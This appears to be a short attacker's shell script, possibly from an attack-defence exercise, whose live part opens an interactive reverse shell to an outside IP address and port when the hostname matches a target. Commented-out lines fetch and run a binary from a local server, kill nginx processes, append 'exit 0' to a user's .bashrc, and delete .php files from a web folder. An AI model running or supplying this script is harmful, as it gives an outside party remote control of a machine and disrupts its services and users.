#!/bin/sh

# echo $(id -u)/$(id -g)
# 
# if ! grep "exit 0" /home/jaruser/.bashrc; then
# cat >> /home/jaruser/.bashrc << EOS
# exit 0
# EOS
# fi

# ps aux | grep nginx.sh | tr -s ' ' | cut -f2 -d' ' | xargs kill -9
# cat >> ~/.bashrc << EOS
# EOS

# ps aux | grep nginx
# ps aux | grep nginx.sh

# wget -qO /var/tmp/resuid http://192.168.100.145:8001/resuid
# chmod +x /var/tmp/resuid
# /var/tmp/resuid

# rm /opt/wwwphp/sport/static/images/*.php

host=$(hostname | cut -d'_' -f2)

if [ "$host" = "192.168.100.125" ]; then
    bash -i >& /dev/tcp/218.79.253.43/55001
fi
